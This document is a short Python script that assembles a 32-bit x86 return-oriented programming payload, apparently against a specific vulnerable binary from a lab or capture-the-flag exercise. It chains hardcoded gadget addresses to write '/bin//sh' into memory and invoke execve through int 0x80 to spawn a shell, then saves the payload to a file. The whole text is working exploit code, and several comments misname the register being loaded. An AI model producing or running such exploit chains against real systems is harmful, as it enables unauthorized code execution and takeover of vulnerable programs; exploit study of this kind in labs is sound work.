from struct import pack
import os
data = 0x080e5010
xor_eax_eax = 0x08050a08 # xor eax, eax ; ret
pop_eax = 0x080ac76a # pop eax ; ret
pop_ebx = 0x08049022 # pop ebx ; ret
pop_ecx = 0x08054f5b # pop ecx ; add al, 0xf6 ; ret
pop_edx = 0x08051836 # pop edx ; add al, 0x31 ; ror byte ptr [ecx - 0x76e7dba4], cl ; ret
inc_eax = 0x0809d0ae # inc eax ; ret
int_80 = 0x080499b2 # int 0x80
mov_ecx_eax = 0x0806cf2d # mov dword ptr [ecx], eax ; pop ebx ; ret
filler = 0x11111111
# Padding goes here
p = bytes('AAAAAAAA', 'ascii')
 
p += pack('<I', pop_ecx) # write address of .data into edx
p += pack('<I', data)
p += pack('<I', pop_eax) # write /bin into eax
p += bytes('/bin', 'ascii')
p += pack('<I', mov_ecx_eax) # mov to .data
p += pack('<I', filler)
p += pack('<I', pop_ecx) # address of .data + 4 into edx
p += pack('<I', data + 4)
p += pack('<I', pop_eax) # //sh into eax
p += bytes('//sh', 'ascii')
p += pack('<I', mov_ecx_eax) # mov to .data
p += pack('<I', filler)
p += pack('<I', pop_ecx) # address of .data + 8 into edx
p += pack('<I', data + 8)
p += pack('<I', xor_eax_eax) # clear eax
p += pack('<I', mov_ecx_eax) # write null after /bin/sh
p += pack('<I', data)
p += pack('<I', pop_ecx) # write arguments into ecx
p += pack('<I', data + 8)
p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', int_80) # call interrupt
print(str(p)[2:-1])
with open('payload', 'wb') as file:
    file.write(p)